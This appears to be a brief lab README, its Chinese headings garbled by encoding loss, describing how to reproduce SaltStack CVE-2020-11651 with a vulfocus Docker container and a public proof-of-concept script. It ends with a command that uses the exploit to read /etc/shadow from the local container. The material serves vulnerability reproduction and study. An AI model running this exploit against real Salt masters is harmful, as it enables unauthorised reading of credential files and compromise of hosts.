#���ֲ���

## �ű���ʹ��https://github.com/jasperla/CVE-2020-11651-poc
## ��װsalt 
Pip3 install salt 

�����װ������������Ի�Դ

pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

## ��ȡ��������

docker pull vulfocus/saltstack-cve_2020_11651

## ���о���

docker run -p 4506:4506 vulfocus/saltstack-cve_2020_11651
�ȴ�һ��
## ���ýű�����

python3 exploit.py --master 127.0.0.1 -r /etc/shadow
![image](https://github.com/guobaoyou/vul_environment/blob/master/SaltStack_RCE/1.png)
����ű�